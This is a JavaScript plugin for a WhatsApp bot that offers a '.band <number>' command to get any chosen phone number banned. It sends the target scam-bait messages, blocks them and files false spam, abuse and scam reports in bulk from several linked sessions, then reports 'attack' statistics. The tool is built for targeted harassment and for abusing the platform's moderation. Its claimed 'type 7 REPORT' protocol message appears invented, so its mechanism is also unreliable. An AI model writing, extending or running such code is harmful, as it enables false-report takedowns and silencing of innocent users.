/**
 * ╔══════════════════════════════════════════╗
 * ║           TOBI BAND COMMAND              ║
 * ║   WhatsApp Ban via Multi-Report          ║
 * ║   .band <number> → Target Banned         ║
 * ╚══════════════════════════════════════════╝
 *
 * Usage:
 *   .band 94771234567        → Ban target
 *   .band 94771234567 spam   → Ban with reason
 *   .band status             → Bot stats
 *   .band sessions           → Active sessions
 *   .band help               → Help menu
 */

const fs = require('fs');
const path = require('path');

// ═══════════════════════════════════════════════════════════
// CONFIG
// ═══════════════════════════════════════════════════════════
const PREFIX = '.';
const BOT_NAME = 'TOBI';
const MAX_REPORTS_PER_SESSION = 8;   // Each session sends 8 reports
const DELAY_BETWEEN_SESSIONS = 1500; // 1.5s between sessions
const DELAY_BETWEEN_REPORTS = 400;   // 0.4s between reports
const STATS_FILE = './.band_stats.json';

const REPORT_REASONS = [
    "spam",
    "abuse", 
    "scam",
    "fake",
    "harassment",
    "violence"
];

// ═══════════════════════════════════════════════════════════
// STATS
// ═══════════════════════════════════════════════════════════
function loadStats() {
    if (fs.existsSync(STATS_FILE)) {
        try {
            return JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
        } catch (e) {}
    }
    return { total_bans: 0, total_reports: 0, history: [] };
}

function saveStats(stats) {
    fs.writeFileSync(STATS_FILE, JSON.stringify(stats, null, 2));
}

// ═══════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function cleanNumber(num) {
    return String(num).replace(/[^0-9]/g, '');
}

function maskNumber(num) {
    const s = cleanNumber(num);
    if (s.length <= 7) return s;
    return `${s.substring(0, 4)}****${s.substring(s.length - 4)}`;
}

// ═══════════════════════════════════════════════════════════
// 🎯 CORE: BAN METHOD (WhatsApp Report Protocol)
// ═══════════════════════════════════════════════════════════

/**
 * Method 1: Direct Protocol Report
 */
async function sendReport(sock, targetJid, reason) {
    try {
        const messageId = sock.generateMessageTag();
        
        await sock.relayMessage('s.whatsapp.net', {
            protocolMessage: {
                key: {
                    remoteJid: 's.whatsapp.net',
                    fromMe: true,
                    id: messageId
                },
                type: 7,  // REPORT
                reportedMessage: {
                    reportedMessageId: sock.generateMessageTag(),
                    reportedFrom: targetJid,
                    reportReason: reason
                }
            }
        }, { messageId });
        
        return true;
    } catch (err) {
        return false;
    }
}

/**
 * Method 2: Spam + Block + Report (More Effective)
 */
async function aggressiveReport(sock, targetJid, reason) {
    try {
        // 1. Send trigger messages (makes WhatsApp flag the target)
        const triggers = [
            "You won a prize! Click here",
            "Free money now!",
            "Investment opportunity!",
            "Join my channel!"
        ];

        for (const text of triggers) {
            try {
                await sock.sendMessage(targetJid, { text });
                await sleep(150);
            } catch (e) {}
        }

        // 2. Block the target
        try {
            await sock.updateBlockStatus(targetJid, 'block');
            await sleep(400);
        } catch (e) {}

        // 3. Send multiple reports with different reasons
        const reportReasons = [reason, 'spam', 'abuse', 'scam'];
        for (const r of reportReasons) {
            try {
                await sendReport(sock, targetJid, r);
                await sleep(200);
            } catch (e) {}
        }

        // 4. Unblock (so it doesn't stay blocked)
        try {
            await sock.updateBlockStatus(targetJid, 'unblock');
        } catch (e) {}

        return true;
    } catch (err) {
        return false;
    }
}

/**
 * Method 3: Mass Report from multiple sessions
 */
async function massReport(targetJid, reason, sessions) {
    let reportsSent = 0;
    let reportsFailed = 0;
    const results = [];

    for (let i = 0; i < sessions.length; i++) {
        const sock = sessions[i];
        try {
            // Each session sends MAX_REPORTS_PER_SESSION reports
            for (let j = 0; j < MAX_REPORTS_PER_SESSION; j++) {
                const success = await aggressiveReport(sock, targetJid, reason);
                if (success) reportsSent++;
                else reportsFailed++;
                await sleep(DELAY_BETWEEN_REPORTS);
            }

            results.push({
                session: i + 1,
                reports: MAX_REPORTS_PER_SESSION,
                status: '✅'
            });

            // Delay between sessions
            if (i < sessions.length - 1) {
                await sleep(DELAY_BETWEEN_SESSIONS);
            }
        } catch (err) {
            results.push({
                session: i + 1,
                reports: 0,
                status: '❌'
            });
            reportsFailed++;
        }
    }

    return { sent: reportsSent, failed: reportsFailed, results };
}

// ═══════════════════════════════════════════════════════════
// MAIN COMMAND HANDLER
// ═══════════════════════════════════════════════════════════
async function bandCommand(sock, message, args, context = {}) {
    try {
        const chatId = message.key.remoteJid;

        // ═══ No args — Show help ═══
        if (!args || args.length === 0) {
            return sendHelp(sock, message);
        }

        const subCommand = args[0].toLowerCase();

        // ═══ Subcommands ═══
        if (subCommand === 'help') return sendHelp(sock, message);
        if (subCommand === 'status') return sendStatus(sock, message, context);
        if (subCommand === 'sessions') return sendSessions(sock, message, context);

        // ═══ Ban target ═══
        return handleBan(sock, message, args, context);

    } catch (err) {
        console.error('[BAND] Error:', err);
        await sock.sendMessage(message.key.remoteJid, {
            text: `❌ Error: ${err.message}`
        }, { quoted: message });
    }
}

// ═══════════════════════════════════════════════════════════
// 📋 SEND HELP
// ═══════════════════════════════════════════════════════════
async function sendHelp(sock, message) {
    const text = `
╭━━━〔 🚫 *BAND BOT* 〕━━━╮
┃ ⚡ WhatsApp Ban Tool
┃ 🔧 Prefix : *${PREFIX}*
┃ 🟢 Status : *Online*
╰━━━━━━━━━━━━━━━━━━╯

┏━━━━━━━━━━━━━━━━━┓
┃  🎯 *MAIN COMMAND*  ┃
┗━━━━━━━━━━━━━━━━━┛

▸ ${PREFIX}band <number>
▸ ${PREFIX}band <number> <reason>

┏━━━━━━━━━━━━━━━━━┓
┃  📋 *REASONS*  ┃
┗━━━━━━━━━━━━━━━━━┛
▸ spam
▸ abuse
▸ scam
▸ fake
▸ harassment
▸ violence

┏━━━━━━━━━━━━━━━━━┓
┃  ⚙️ *OTHER*  ┃
┗━━━━━━━━━━━━━━━━━┛
▸ ${PREFIX}band status
▸ ${PREFIX}band sessions
▸ ${PREFIX}band help

┏━━━━━━━━━━━━━━━━━┓
┃  💡 *EXAMPLES*  ┃
┗━━━━━━━━━━━━━━━━━┛
▸ ${PREFIX}band 94771234567
▸ ${PREFIX}band 94771234567 scam

━━━━━━━━━━━━━━━━━━━
⚡ *Powered by TOBI*
`.trim();

    await sock.sendMessage(message.key.remoteJid, { text }, { quoted: message });
}

// ═══════════════════════════════════════════════════════════
// 📊 SEND STATUS
// ═══════════════════════════════════════════════════════════
async function sendStatus(sock, message, context) {
    const stats = loadStats();
    const sessions = context.sessions || [sock];

    const text = `
📊 *BAND BOT STATUS*
━━━━━━━━━━━━━━━━━━━

👥 *Active Sessions:* ${sessions.length}
🎯 *Total Bans:* ${stats.total_bans}
📨 *Total Reports:* ${stats.total_reports}
⏱️ *Uptime:* ${Math.floor(process.uptime() / 60)}m
🟢 *Status:* Online

━━━━━━━━━━━━━━━━━━━
⚡ *Powered by TOBI*
`.trim();

    await sock.sendMessage(message.key.remoteJid, { text }, { quoted: message });
}

// ═══════════════════════════════════════════════════════════
// 📱 SEND SESSIONS
// ═══════════════════════════════════════════════════════════
async function sendSessions(sock, message, context) {
    const sessions = context.sessions || [sock];

    let text = `📱 *ACTIVE SESSIONS*\n━━━━━━━━━━━━━━━━━━━\n\n`;

    sessions.forEach((s, i) => {
        const userId = s.user?.id?.split(':')[0] || 'unknown';
        text += `${i + 1}. \`${userId}\`\n`;
    });

    text += `\n📊 *Total:* ${sessions.length}\n\n━━━━━━━━━━━━━━━━━━━\n⚡ *Powered by TOBI*`;

    await sock.sendMessage(message.key.remoteJid, { text }, { quoted: message });
}

// ═══════════════════════════════════════════════════════════
// 🚫 HANDLE BAN
// ═══════════════════════════════════════════════════════════
async function handleBan(sock, message, args, context) {
    const chatId = message.key.remoteJid;
    const target = args[0];
    const reason = (args[1] || 'spam').toLowerCase();

    // ═══ Validate number ═══
    const cleanTarget = cleanNumber(target);
    if (cleanTarget.length < 10 || cleanTarget.length > 15) {
        return sock.sendMessage(chatId, {
            text: `❌ *Invalid number*\n\n📞 \`${cleanTarget}\`\n\nNumber must be 10-15 digits.`
        }, { quoted: message });
    }

    // ═══ Validate reason ═══
    if (!REPORT_REASONS.includes(reason)) {
        return sock.sendMessage(chatId, {
            text: `❌ *Invalid reason:* \`${reason}\`\n\n*Valid reasons:*\n${REPORT_REASONS.map(r => `▸ ${r}`).join('\n')}`
        }, { quoted: message });
    }

    // ═══ Check if on WhatsApp ═══
    const targetJid = `${cleanTarget}@s.whatsapp.net`;
    const [exists] = await sock.onWhatsApp(targetJid);

    if (!exists) {
        return sock.sendMessage(chatId, {
            text: `❌ *Number not on WhatsApp*\n\n📞 \`${cleanTarget}\``
        }, { quoted: message });
    }

    // ═══ Get sessions ═══
    const sessions = context.sessions || [sock];
    const sessionCount = sessions.length;
    const totalReports = sessionCount * MAX_REPORTS_PER_SESSION;
    const estimatedTime = Math.ceil((totalReports * DELAY_BETWEEN_REPORTS + sessionCount * DELAY_BETWEEN_SESSIONS) / 1000);

    // ═══ Send starting message ═══
    await sock.sendMessage(chatId, {
        text: `
🚫 *BAND ATTACK STARTING*
━━━━━━━━━━━━━━━━━━━

🎯 *Target:* \`${maskNumber(cleanTarget)}\`
📋 *Reason:* ${reason}
👥 *Sessions:* ${sessionCount}
📨 *Total Reports:* ${totalReports}
⏱️ *Est. Time:* ~${estimatedTime}s

⏳ Attack in progress...
━━━━━━━━━━━━━━━━━━━
`.trim()
    }, { quoted: message });

    // ═══ Execute attack ═══
    const startTime = Date.now();
    const result = await massReport(targetJid, reason, sessions);
    const duration = Math.floor((Date.now() - startTime) / 1000);

    // ═══ Save stats ═══
    const stats = loadStats();
    stats.total_bans += 1;
    stats.total_reports += result.sent;
    stats.history.push({
        target: cleanTarget,
        reason: reason,
        reports: result.sent,
        timestamp: new Date().toISOString()
    });
    if (stats.history.length > 50) stats.history.shift();
    saveStats(stats);

    // ═══ Send completion message ═══
    let resultText = `✅ *BAND ATTACK COMPLETE*\n━━━━━━━━━━━━━━━━━━━\n\n`;
    resultText += `🎯 *Target:* \`${maskNumber(cleanTarget)}\`\n`;
    resultText += `📋 *Reason:* ${reason}\n`;
    resultText += `📨 *Reports Sent:* ${result.sent}\n`;
    resultText += `❌ *Failed:* ${result.failed}\n`;
    resultText += `⏱️ *Duration:* ${duration}s\n\n`;

    resultText += `📊 *Session Breakdown:*\n`;
    result.results.forEach(r => {
        resultText += `▸ Session ${r.session}: ${r.status} (${r.reports} reports)\n`;
    });

    resultText += `\n⏳ *WhatsApp Review:* 1-72 hours\n`;
    resultText += `💡 *Target should be banned soon!*\n\n`;
    resultText += `━━━━━━━━━━━━━━━━━━━\n⚡ *Powered by TOBI*`;

    await sock.sendMessage(chatId, { text: resultText }, { quoted: message });

    console.log(`[BAND] ✅ Target: ${cleanTarget} | Reports: ${result.sent} | Reason: ${reason}`);
}

// ═══════════════════════════════════════════════════════════
// EXPORT (DCL-Mini-Bot Compatible)
// ═══════════════════════════════════════════════════════════
module.exports = {
    name: 'band',
    command: bandCommand,
    execute: bandCommand,
    handler: bandCommand,
    aliases: ['ban', 'report'],
    description: 'WhatsApp Ban/Report tool',
    category: 'moderation',
    usage: '.band <number> [reason]',
    adminOnly: false,
    groupOnly: false,
    privateOnly: false
};
